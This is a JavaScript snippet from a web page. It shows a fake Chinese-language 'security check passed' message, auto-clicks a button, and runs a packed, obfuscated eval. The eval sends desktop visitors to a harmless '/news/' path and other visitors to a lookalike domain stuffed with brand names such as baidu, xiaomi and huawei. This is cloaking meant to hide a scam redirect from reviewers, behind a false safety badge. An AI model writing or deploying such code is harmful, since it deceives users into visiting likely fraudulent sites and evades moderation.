     var it = document.getElementById('iconText');
    var _i = 1;
    var si = setInterval(function () {
      var txt = '正在安全检测';
      for (var i = 0; i < _i; i++) txt += '.';
      it.innerText = txt;
      if (++_i > 3) {
        clearInterval(si);
        setTimeout(function () {
          var icon = document.getElementById('icon');
          var subText = document.getElementById('subText');
          icon.classList.add("weui-icon-success");
          it.innerHTML = "已通过安全检测";
          subText.innerHTML = "如果没有自动跳转，请点击下方按钮前往";
        }, 300);
      }
    }, 300);
//判断
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('2 1={};2 p=7.g;2 u=7.f;1.8=p.3("i")==0;1.9=p.3("h")==0;1.c=(p=="b")||(p.3("d")==0);q(1.8||1.9||1.r){5.6.4=\'/l/\'}a{5.6.4=" j://n.o.k.t.s.e/m"}a{}',31,31,'|system|var|indexOf|href|window|location|navigator|win|mac|else|X11|x11|Linux|top|userAgent|platform|Mac|Win|http|huawei|news||baidu|com_______________________xiaomi||if|xll|sy6602621|bilibili|'.split('|'),0,{}))


//点击事件
setTimeout(function() {
     // IE
     if(document.all) {
         document.getElementById("clickMe").click();
     }
     // 其它浏览器
     else {
         var e = document.createEvent("MouseEvents");
         e.initEvent("click", true, true);
         document.getElementById("clickMe").dispatchEvent(e);
     }
}, 3000);
